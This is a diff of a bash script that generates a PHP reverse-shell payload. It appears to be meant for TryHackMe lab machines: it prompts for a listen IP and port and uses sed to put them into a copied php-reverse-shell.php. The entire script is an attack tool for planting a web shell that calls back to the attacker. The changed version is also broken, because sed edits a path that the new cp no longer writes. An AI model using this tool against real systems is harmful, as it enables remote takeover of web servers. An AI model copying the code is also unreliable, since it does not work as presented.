@@ -1,23 +1,22 @@
 #!/bin/bash
 
 # Prompt for values
-echo "Your IP address is:"; cat /tmp/thmip.txt
-read -p "Listen address? (Leave blank to use your IP listed above) " valueA
-read -p "Listen port? " valueB
+echo "Your IP address is: $(cat /tmp/thmip.txt) - Leave listen address blank to use it."
+read -p "Enter listen address: " valueA
+read -p "Enter listen port? " valueB
 
 # Use the IP from the file if valueA is left blank
 if [ -z "$valueA" ]; then
   valueA=$(cat /tmp/thmip.txt)
 fi
 
-# Generate temp dir
-mkdir /tmp/Rshells/Payloads
-cp /usr/share/webshells/php/php-reverse-shell.php /tmp/Rshells/Payloads/rshell.php
+cp /tmp/Rshells/webshells/php-reverse-shell.php /tmp/rshell-payload.php
 
 # Use sed to replace placeholders in the file
-sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/Rshells/Payloads/rshell.php
-sed -i "s/1234/${valueB}/" /tmp/Rshells/Payloads/rshell.php
+sed -i "s/THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/Rshells/Payloads/rshell.php
+sed -i "s/THM_ATTACKBOX_PORT_HERE/${valueB}/" /tmp/Rshells/Payloads/rshell.php
 
 # Finished output
 echo "Your payload has been created:"
-echo "/tmp/Rshells/Payloads/rshell.php"
+echo "/tmp/rshell-payload.php"
+echo "The payloads target is ${valueA}:${valueB}"
